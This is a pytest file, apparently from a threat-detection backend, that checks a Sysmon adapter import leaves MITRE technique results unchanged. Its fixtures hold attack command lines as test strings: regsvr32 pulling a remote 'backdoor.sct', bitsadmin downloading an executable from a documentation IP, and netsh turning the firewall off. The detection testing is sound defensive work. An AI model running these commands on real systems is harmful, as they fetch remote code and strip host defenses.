"""P2 Slice-1 · Corpus impact invariant.

Owner rule #10: "Preserve all existing remediation behavior and the
frozen 12-case regression gate."

This test locks the invariant that importing / registering
`services.behavioral.sysmon_adapter` and the `/api/behavioral/sysmon`
router MUST NOT alter the /api/analyze verdict/MITRE surface for the
frozen 12-case corpus. If any future edit accidentally patches the
shared `services.die.api.analyze` path from inside the behavioral
adapter (e.g. registering a global hook), this test catches it.
"""
from __future__ import annotations
import hashlib
import json
import sys
from pathlib import Path

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))


# Small representative corpus subset — the ones most sensitive to
# authoritative-surface changes. Full 12-case replay is done by the
# `harness.py` script (out of pytest scope; run manually per ADR-0010p).
_SUBSET = [
    ("rip-04",
      "regsvr32.exe /s /n /u /i:"
      "http://198.51.100.99/backdoor.sct scrobj.dll",
      {"T1218.010"}),
    ("rip-07", "netsh advfirewall set allprofiles state off",
      {"T1562.004"}),
    ("rip-11",
      "bitsadmin.exe /transfer job1 /priority foreground "
      "http://198.51.100.42/m.exe C:\\ProgramData\\m.exe",
      {"T1197", "T1105"}),
    ("rip-06",
      "Get-ChildItem C:\\Users\\jsmith\\Documents -Recurse "
      "-Include *.docx | Export-Csv C:\\Temp\\docs.csv",
      set()),
]


def _canonical_ids(text: str) -> frozenset:
    """Snapshot the authoritative technique ids for a given text."""
    from services.die.api import analyze as die_analyze
    env = die_analyze(text)
    return frozenset(
        t["id"] for t in (env.get("techniques") or [])
        if isinstance(t, dict) and t.get("id")
    )


def test_authoritative_surface_unchanged_after_behavioral_import():
    """Import the P2 adapter + router, then verify the authoritative
    surface still matches the UI-DEF-02 baseline expectations."""
    # Import happens fresh in this process; anti-side-effect check.
    import services.behavioral.sysmon_adapter  # noqa: F401
    import routers.behavioral                    # noqa: F401

    failures = []
    for label, cmd, required_ids in _SUBSET:
        ids = _canonical_ids(cmd)
        missing = required_ids - ids
        if missing:
            failures.append(f"{label}: missing {sorted(missing)} "
                             f"(got {sorted(ids)})")
    assert not failures, (
        "P2 Slice-1 leaked side-effects into the authoritative MITRE "
        f"surface:\n" + "\n".join(failures)
    )


def test_rip06_no_regex_fp_reintroduced():
    """rip-06 (benign Get-ChildItem) MUST still return an empty
    authoritative technique set even with the behavioral adapter
    loaded — no accidental regex resurrection."""
    import services.behavioral.sysmon_adapter  # noqa: F401
    import routers.behavioral                    # noqa: F401
    ids = _canonical_ids(_SUBSET[3][1])
    assert ids == frozenset(), (
        f"rip-06 regressed with regex-style FPs: {sorted(ids)}"
    )
